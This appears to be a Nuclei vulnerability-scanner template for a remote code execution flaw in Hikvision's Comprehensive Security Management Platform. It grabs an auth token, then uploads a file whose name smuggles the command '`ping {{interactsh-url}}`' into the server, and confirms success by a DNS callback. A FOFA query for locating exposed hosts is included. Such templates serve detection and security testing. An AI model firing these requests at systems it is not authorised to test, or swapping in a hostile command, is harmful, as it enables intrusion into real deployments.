http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: header_1
    regex:
    - Token:\s*([A-Za-z0-9=]+)
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  raw:
  - 'GET /iac/iasService/v1/register HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 10s

    POST /svm/api/v1/productFile?type=product&ip=127.0.0.1&agentNo=1 HTTP/1.1

    Host: {{Hostname}}

    Token: {{token}}

    Accept-Encoding: gzip, deflate

    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805


    -----------------------------142851345723692939351758052805

    Content-Disposition: form-data; name="file"; filename="`ping {{interactsh-url}}`.zip"

    Content-Type: application/zip


    xxx

    -----------------------------142851345723692939351758052805--

    '
id: hikvision-csmp-productfile-rce
info:
  author: Co5mos
  description: 'Hikvision Comprehensive Security Management Platform productFile interface
    in historical versions has a remote code execution vulnerability. Due to insufficient
    validation of the file upload interface, an attacker can upload malicious files
    to the platform, leading to service privilege escalation or service disruption.

    '
  metadata:
    fofa-query: app="HIKVISION-iSecure-Center"
  name: Hikvision Comprehensive Security Management Platform productFile - Remote
    Code Execution
  severity: critical
  tags: rce, hikvision, file-upload
